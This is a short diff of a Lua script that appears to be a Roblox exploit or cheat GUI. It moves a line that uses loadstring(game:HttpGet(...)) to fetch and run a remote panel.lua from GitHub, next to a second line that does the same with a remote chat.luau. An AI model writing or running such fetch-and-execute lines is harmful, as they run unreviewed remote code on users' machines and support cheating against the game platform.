@@ -2942,7 +2942,6 @@ local function scanGui()
 end
 
 scanGui()
-loadstring(game:HttpGet("https://github.com/systemzyx/xyz/blob/main/panel.lua?raw=true"))()
 for _, obj in ipairs(game:GetService("CoreGui").RobloxGui:WaitForChild("TCJT_PRIVATE"):GetDescendants()) do
     setupButton(obj)
 end
@@ -2977,4 +2976,5 @@ coroutine.wrap(MMOF_fake_script)()
 coroutine.wrap(OHZSZXY_fake_script)()
 coroutine.wrap(LZLXRPZ_fake_script)()
 coroutine.wrap(QOXL_fake_script)()
+loadstring(game:HttpGet("https://github.com/systemzyx/xyz/blob/main/panel.lua?raw=true"))()
 loadstring(game:HttpGet("https://github.com/SxripterRar/vXs.lua/blob/main/chat.luau?raw=true"))()
